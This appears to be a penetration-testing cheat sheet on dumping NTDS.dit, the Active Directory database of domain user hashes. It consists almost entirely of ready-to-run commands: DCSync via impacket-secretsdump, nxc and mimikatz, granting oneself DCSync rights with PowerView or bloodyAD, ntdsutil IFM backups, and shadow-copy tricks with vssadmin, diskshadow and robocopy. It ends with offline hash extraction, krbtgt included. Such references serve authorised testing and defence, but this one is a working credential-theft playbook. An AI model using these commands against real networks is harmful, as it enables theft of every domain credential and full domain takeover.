---
icon: server
---

# NTDS.dit Dumping

NTDS.dit is the AD database on Domain Controllers — contains ALL domain user hashes. The crown jewel.

**Requirement:** Domain Admin / DCSync rights / SeBackupPrivilege on DC

***

### DCSync (Linux — No file needed)

Mimics DC replication to pull hashes remotely. Best method.

```bash
# All hashes
impacket-secretsdump corp.local/administrator:Password123@dc-ip -just-dc

# Only NTLM hashes
impacket-secretsdump corp.local/administrator:Password123@dc-ip -just-dc-ntlm

# Specific user
impacket-secretsdump corp.local/administrator:Password123@dc-ip -just-dc-user krbtgt

# Via nxc
nxc smb dc-ip -u administrator -p Password123 --ntds
```

***

### DCSync (Windows — mimikatz)

```powershell
# All domain hashes
.\\mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"

# Specific user
.\\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
.\\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator" "exit"
```

***

### Add DCSync rights then dump (Windows + Linux)

If you have WriteDACL on domain:

```powershell
# Windows — PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity john -Rights DCSync
```

```bash
# Linux — bloodyAD
bloodyAD --host dc-ip -d corp.local -u john -p Password123 add dcsync "john"

# Then DCSync
impacket-secretsdump corp.local/john:Password123@dc-ip -just-dc-ntlm
```

***

### ntdsutil (Windows — on DC, no creds needed)

```bash
# Create IFM (Install From Media) backup — dumps NTDS + SYSTEM + SECURITY
ntdsutil.exe "ac i ntds" "ifm" "create full C:\\temp" q q

# Or via PowerShell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q"
```

Parse on Linux:

```bash
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL
```

***

### Volume Shadow Copy / diskshadow (Windows)

When you can't do DCSync — copy NTDS.dit via VSS.

#### **vssadmin**

```bash
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive
```

#### **diskshadow script**

```bash
# Create shadow.txt
echo set context persistent nowriters > shadow.txt
echo add volume c: alias trophy >> shadow.txt
echo create >> shadow.txt
echo expose %trophy% z: >> shadow.txt

# Run it
diskshadow.exe /s shadow.txt
copy z:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit

# Cleanup
diskshadow.exe
> delete shadows volume trophy
> reset
```

Parse on Linux:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

***

### SeBackupPrivilege + DiskShadow + Robocopy (Windows)

If you have SeBackupPrivilege (Backup Operators group):

```bash
# Create diskshadow script
echo set context persistent nowriters > C:\\temp\\shadow.txt
echo add volume c: alias gzzcoo >> C:\\temp\\shadow.txt
echo create >> C:\\temp\\shadow.txt
echo expose %gzzcoo% g: >> C:\\temp\\shadow.txt

diskshadow.exe /s C:\\temp\\shadow.txt

# Copy NTDS with Robocopy (SeBackupPrivilege allows bypass of DACL)
robocopy /b g:\\Windows\\NTDS\\ C:\\temp\\ ntds.dit

# Get SYSTEM hive
reg save HKLM\\SYSTEM C:\\temp\\SYSTEM
```

Parse on Linux:

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

***
